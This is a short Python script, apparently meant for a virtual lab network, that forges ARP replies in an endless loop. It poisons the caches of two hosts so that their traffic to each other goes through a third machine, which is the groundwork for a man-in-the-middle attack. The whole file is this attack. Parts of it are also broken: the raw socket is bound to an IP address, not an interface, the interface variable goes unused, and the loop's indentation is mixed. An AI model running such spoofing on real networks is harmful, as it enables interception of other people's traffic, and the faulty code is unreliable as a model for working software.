import socket
import struct

#Testing purpose

def send_arp_reply(interface, source_ip, source_mac, target_ip, target_mac):
    # Create a raw socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)

    # Set the interface for sending the packet
    s.bind(("192.168.56.0", 0))

    # Craft the ARP reply packet
    ethernet_header = struct.pack("!6s6sH", target_mac, source_mac, 0x0806)
    arp_header = struct.pack("!HHBBH6s4s6s4s",
                             0x0001, 0x0800, 6, 4,
                             2, source_mac,
                             socket.inet_aton(source_ip),
                             target_mac,
                             socket.inet_aton(target_ip))

    # Concatenate the headers to form the complete ARP reply packet
    packet = ethernet_header + arp_header

    # Send the packet
    s.send(packet)


if __name__ == "__main__":
    # Specify the network interface
    interface = "Wi-Fi"

    # Specify the IP addresses
    source_ip1 = "192.168.56.101"
    source_ip2 = "192.168.56.102"
    
    # Example MAC address X (\x08\x00\x27\xAA\x76\xDB) (\x08\x00\x27\x25\xf9\x4D)
    source_mac = b'\x0a\x00\x27\x00\x00\x13'   
    
    # Address of the target
    target_ip1 = "192.168.56.102"
    target_mac1 = b'\x08\x00\x27\xaa\x76\xdb'  
    
    target_ip2 = "192.168.56.101"
    target_mac2 = b'\x08\x00\x27\x25\xf9\x4d'  

    # Send the ARP reply packet
    while True:
    	send_arp_reply(interface, source_ip1, source_mac, target_ip1, target_mac1)
    	send_arp_reply(interface, source_ip2, source_mac, target_ip2, target_mac2)
